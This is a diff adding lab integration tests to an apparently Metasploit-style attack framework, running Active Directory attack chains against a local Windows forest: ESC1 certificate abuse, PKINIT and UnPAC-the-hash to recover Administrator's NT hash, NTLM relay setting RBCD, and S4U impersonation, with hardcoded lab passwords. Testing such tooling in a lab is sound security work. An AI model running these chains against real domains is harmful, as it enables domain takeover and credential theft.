@@ -3610,17 +3610,311 @@ class TestRelaySmbLab(unittest.TestCase):
         finally:
             console.store.close()
 
-    def _login_as_fzrelay(self, relay_ip):
+    @classmethod
+    def _login_as(cls, relay_ip, user, password, domain):
         subprocess.run(
-            ["docker", "run", "--rm", "--network", self.network,
+            ["docker", "run", "--rm", "--network", cls.network,
              "forge-relay-test", "python", "-c",
              "from impacket.smbconnection import SMBConnection\n"
              f"conn = SMBConnection('{relay_ip}', '{relay_ip}',"
              " sess_port=445, timeout=10)\n"
-             "conn.login('FZRELAY$', 'Passw0rd123!', 'forge.local')\n"
-             "print('machine account login ok')\n"
+             f"conn.login('{user}', '{password}', '{domain}')\n"
+             "print('login ok')\n"
              "conn.close()"],
             capture_output=True, text=True, timeout=60)
+
+    @classmethod
+    def _login_as_fzrelay(cls, relay_ip):
+        cls._login_as(relay_ip, 'FZRELAY$', 'Passw0rd123!', 'forge.local')
+
+
+WINDC = "127.0.0.2"  # the domain lab's Windows forest DC (real AD ports)
+
+
+def windc_wait_ready():
+    """WINDC-READY sentinel over C$ (local labadmin auth works on the
+    guest). The cold build (install, forest create, CA, fixtures, KDC
+    cert) takes ~25 min; the window covers it."""
+    from impacket.smbconnection import SMBConnection
+    deadline = time.time() + 2400
+    while time.time() < deadline:
+        try:
+            conn = SMBConnection(WINDC, WINDC, sess_port=445, timeout=10)
+            conn.login("labadmin", "Labpass2024!")
+            buf = []
+            conn.getFile("C$", r"OEM\WINDC-READY.txt", buf.append)
+            conn.close()
+            raw = b"".join(buf)
+            text = raw.decode("ascii", "replace").strip()
+            if text == "ready":
+                return
+        except Exception:
+            time.sleep(20)
+
+
+@unittest.skipUnless(docker_available(), "docker daemon not available")
+@unittest.skipUnless(impacket_available(), "impacket not installed")
+@unittest.skipUnless(windows_lab_enabled(), "set FORGE_WINDOWS_LAB=1 to enable")
+class TestWindowsForestLab(unittest.TestCase):
+    """The windc role itself: a standalone Windows AD forest
+    (wforge.local) with AD CS on the same box — built because dcpromo
+    INTO the Samba domain fails twice (unjoined prerequisite access
+    denied, then forestprep's LDIF schema update refused with Ldap
+    error 50 — Windows adprep is not a supported path against Samba).
+    Proof here is protocol-level: a real AS-REQ against the Windows KDC
+    and a real LDAP answer from its DS."""
+
+    @classmethod
+    def setUpClass(cls):
+        cls.manager = LabManager(ROOT / "labs")
+        cls.manager.up("domain")
+        windc_wait_ready()
+
+    @classmethod
+    def tearDownClass(cls):
+        cls.manager.down("domain")
+
+    def test_kdc_and_ds_answer(self):
+        registry = ModuleRegistry(ROOT / "modules")
+        registry.load()
+        console = FrameworkConsole(registry, Store(":memory:"))
+        try:
+            buf = io.StringIO()
+            with contextlib.redirect_stdout(buf):
+                for command in (
+                    "use auxiliary/login/kerberos_login",
+                    f"set RHOSTS {WINDC}",
+                    "set DOMAIN wforge.local",
+                    "set USERNAME analyst",
+                    "set PASSWORD Summer2024!",
+                    "run",
+                ):
+                    console.onecmd(command)
+            out = buf.getvalue()
+            self.assertNotIn("Traceback", out)
+            self.assertIn("analyst", out)
+        finally:
+            console.store.close()
+        # and the DS answers a real search as the forest admin
+        from impacket.ldap import ldap as impacket_ldap
+        from impacket.ldap import ldapasn1
+        conn = impacket_ldap.LDAPConnection(f"ldap://{WINDC}")
+        conn.login("Administrator", "P@ssw0rd123", "wforge.local")
+        found = False
+        for packet in conn.search(
+                searchBase="DC=wforge,DC=local",
+                searchFilter="(sAMAccountName=analyst)",
+                attributes=["sAMAccountName"]):
+            if isinstance(packet, ldapasn1.SearchResultEntry):
+                found = True
+        conn.close()
+        self.assertTrue(found)
+
+
+@unittest.skipUnless(docker_available(), "docker daemon not available")
+@unittest.skipUnless(impacket_available(), "impacket not installed")
+@unittest.skipUnless(windows_lab_enabled(), "set FORGE_WINDOWS_LAB=1 to enable")
+class TestPkinitWindowsLab(unittest.TestCase):
+    """pkinit against the Windows KDC, the full thing Samba can't do:
+    esc1 mints an Administrator cert from the windc's own CA, pkinit
+    turns it into a TGT, and UnPAC-the-hash returns Administrator's NT
+    hash — verified against MD4 of the known password."""
+
+    @classmethod
+    def setUpClass(cls):
+        cls.manager = LabManager(ROOT / "labs")
+        cls.manager.up("domain")
+        windc_wait_ready()
+
+    @classmethod
+    def tearDownClass(cls):
+        cls.manager.down("domain")
+
+    def test_cert_to_tgt_to_hash(self):
+        import tempfile
+        registry = ModuleRegistry(ROOT / "modules")
+        registry.load()
+        console = FrameworkConsole(registry, Store(":memory:"))
+        try:
+            out = ""
+            # a freshly-(re)started CA answers the cert pipe before its
+            # own AD reads settle — the policy module denies with
+            # "could not be contacted" for several minutes. Retry
+            # through it; the assertions judge only the final attempt.
+            for _attempt in range(15):
+                buf = io.StringIO()
+                with contextlib.redirect_stdout(buf):
+                    for command in (
+                        "use auxiliary/attack/esc1",
+                        f"set RHOSTS {WINDC}",
+                        f"set CA_HOST {WINDC}",
+                        "set DOMAIN wforge.local",
+                        "set USERNAME analyst",
+                        "set PASSWORD Summer2024!",
+                        "run",
+                    ):
+                        console.onecmd(command)
+                out = buf.getvalue()
+                if "cert issued" in out:
+                    break
+                time.sleep(30)
+            self.assertNotIn("Traceback", out)
+            self.assertIn("cert issued", out)
+            loot = console.store.loot("cert")
+            self.assertEqual(len(loot), 1)
+            with tempfile.NamedTemporaryFile(
+                    "w", suffix=".pem", delete=False) as f:
+                f.write(loot[0]["content"])
+                pem = f.name
+            buf = io.StringIO()
+            with contextlib.redirect_stdout(buf):
+                for command in (
+                    "use auxiliary/attack/pkinit",
+                    f"set RHOSTS {WINDC}",
+                    "set DOMAIN wforge.local",
+                    "set USERNAME Administrator",
+                    f"set CERTFILE {pem}",
+                    "run",
+                ):
+                    console.onecmd(command)
+            out = buf.getvalue()
+            self.assertNotIn("Traceback", out)
+            self.assertIn("TGT", out)
+            from impacket.ntlm import compute_nthash
+            expected = compute_nthash("P@ssw0rd123").hex()
+            self.assertIn(expected, out.lower())
+        finally:
+            console.store.close()
+
+
+@unittest.skipUnless(docker_available(), "docker daemon not available")
+@unittest.skipUnless(impacket_available(), "impacket not installed")
+@unittest.skipUnless(windows_lab_enabled(), "set FORGE_WINDOWS_LAB=1 to enable")
+class TestRelayRbcdWindowsLab(unittest.TestCase):
+    """The full chain Samba parks: add_computer on the Windows DC, a
+    machine-account auth at the in-net relay, relay to the Windows DS,
+    RBCD WRITTEN (Windows accepts the machine self-write Samba denies),
+    then s4u from the written delegation into a real ticket."""
+
+    @classmethod
+    def setUpClass(cls):
+        cls.manager = LabManager(ROOT / "labs")
+        cls.manager.up("domain")
+        windc_wait_ready()
+        cls.network = cls._domain_network()
+
+    @classmethod
+    def tearDownClass(cls):
+        subprocess.run(["docker", "rm", "-f", "forge-relay"],
+                       capture_output=True)
+        cls.manager.down("domain")
+
+    @classmethod
+    def _domain_network(cls):
+        out = subprocess.run(
+            ["docker", "inspect", "forge-lab-domain-dc-1", "-f",
+             "{{range $k, $v := .NetworkSettings.Networks}}{{$k}}{{end}}"],
+            check=True, capture_output=True, text=True)
+        return out.stdout.strip()
+
+    def test_full_chain(self):
+        registry = ModuleRegistry(ROOT / "modules")
+        registry.load()
+        console = FrameworkConsole(registry, Store(":memory:"))
+        try:
+            buf = io.StringIO()
+            with contextlib.redirect_stdout(buf):
+                for command in (
+                    "use auxiliary/attack/add_computer",
+                    f"set RHOSTS {WINDC}",
+                    "set DOMAIN wforge.local",
+                    "set USERNAME Administrator",
+                    "set PASSWORD P@ssw0rd123",
+                    "set COMPUTER_NAME FZRELAY$",
+                    "set DELETE true",
+                    "run",
+                    "use auxiliary/attack/add_computer",
+                    f"set RHOSTS {WINDC}",
+                    "set DOMAIN wforge.local",
+                    "set USERNAME Administrator",
+                    "set PASSWORD P@ssw0rd123",
+                    "set COMPUTER_NAME FZRELAY$",
+                    "set COMPUTER_PASSWORD Passw0rd123!",
+                    "run",
+                ):
+                    console.onecmd(command)
+            out = buf.getvalue()
+            self.assertNotIn("Traceback", out)
+            self.assertIn("authenticates", out)
+        finally:
+            console.store.close()
+
+        # the relay, in-network, forwarding to the Windows DS
+        relay = TestRelaySmbLab
+        relay.network = self.network
+        relay_ip = relay._start_in_net_relay("10.10.10.20", "FZRELAY$", 60)
+        try:
+            time.sleep(4)
+            relay._login_as(relay_ip, 'FZRELAY$', 'Passw0rd123!',
+                            'wforge.local')
+            deadline = time.time() + 150
+            while time.time() < deadline:
+                state = subprocess.run(
+                    ["docker", "inspect", "forge-relay", "-f",
+                     "{{.State.Running}}"],
+                    capture_output=True, text=True)
+                if "false" in state.stdout:
+                    break
+                time.sleep(3)
+            out = relay._relay_logs()
+            self.assertIn("relayed WFORGE.LOCAL\\FZRELAY$", out)
+            self.assertIn("RBCD set via relay", out)
+        finally:
+            subprocess.run(["docker", "rm", "-f", "forge-relay"],
+                           capture_output=True)
+
+        # verify the artifact: FZRELAY$'s SID is in its own RBCD SD
+        registry = ModuleRegistry(ROOT / "modules")
+        registry.load()
+        console = FrameworkConsole(registry, Store(":memory:"))
+        try:
+            buf = io.StringIO()
+            with contextlib.redirect_stdout(buf):
+                for command in (
+                    "use auxiliary/attack/rbcd",
+                    f"set RHOSTS {WINDC}",
+                    "set DOMAIN wforge.local",
+                    "set USERNAME Administrator",
+                    "set PASSWORD P@ssw0rd123",
+                    "set ACTION get",
+                    "set TARGET FZRELAY$",
+                    "run",
+                ):
+                    console.onecmd(command)
+            out = buf.getvalue()
+            self.assertNotIn("Traceback", out)
+            self.assertIn("allows", out)
+            # then s4u from FZRELAY$ into a ticket as Administrator
+            buf = io.StringIO()
+            with contextlib.redirect_stdout(buf):
+                for command in (
+                    "use auxiliary/attack/s4u",
+                    f"set RHOSTS {WINDC}",
+                    "set DOMAIN wforge.local",
+                    "set USERNAME FZRELAY$",
+                    "set PASSWORD Passw0rd123!",
+                    "set SPN cifs/fzrelay.wforge.local",
+                    "set IMPERSONATE Administrator",
+                    "run",
+                ):
+                    console.onecmd(command)
+            out = buf.getvalue()
+            self.assertNotIn("Traceback", out)
+            self.assertIn("Administrator", out)
+            loot = console.store.loot("ticket")
+            self.assertTrue(len(loot) >= 1, out[-400:])
+        finally:
+            console.store.close()
 
 
 @unittest.skipUnless(docker_available(), "docker daemon not available")
